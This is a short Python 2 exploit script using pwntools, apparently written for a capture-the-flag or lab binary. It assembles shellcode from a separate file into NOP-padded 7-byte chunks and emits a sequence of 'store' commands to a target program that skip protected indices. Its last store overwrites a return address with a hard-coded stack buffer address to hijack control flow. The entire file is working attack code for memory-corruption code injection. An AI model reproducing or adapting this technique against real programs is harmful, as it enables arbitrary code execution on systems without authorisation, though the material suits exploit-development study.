from pwnlib.asm import asm
from struct import unpack
from struct import pack


#address of buffer to return to
buff_addr = 0xbffff50c
max_len = 7
f = open("sploit.asm")
sploit = ""
buff = ""
for cmd in f:
	#want to build a buffer of 7 bytes -- padded with NOPs if needed
	#print cmd
	bytes = asm(cmd)
	#check if illegal cmd --  longer than 7 bytes
	if len(bytes) > max_len:
		print "Illegal Command!"
		print  cmd
	#it's not illegal -- check if it fits in the current buffer
	if (len(buff) + len(bytes)) > max_len:
		#doesn't fit need to write the current buffer
		nop_count = max_len - len(buff)
		buff += chr(0x90)*nop_count
		#buff += chr(0xeb)
		#buff += chr(0x04)
		buff += chr(0x2d) #subtracts following 4 bytes from eax -- eax -=0
		#write the buffer
		sploit += buff
		buff = ""
	#can now write to buffer
	buff += bytes
#sploit is now made, now need to turn sploit into program input
#first: convert into array
t_buff = ""
new_sploit = []
for c in sploit:
	t_buff += c
	if len(t_buff) == 4:
		new_sploit.append(t_buff)
		t_buff = ""

#hex-strings are made
#want to convert the hex strings into numbers
a = [unpack("<I", x)[0] for x in new_sploit]
#are now converted into numbers -- next output as store instructions for the program
index = 1
for word in a:
	if (index % 3 == 0):
		index += 1 #skip this index
	print "store"
	print word
	print index
	index += 1

#memory set -- just need to set the return address
print "store"
print buff_addr
print 109
print "quit"


#print new_sploit








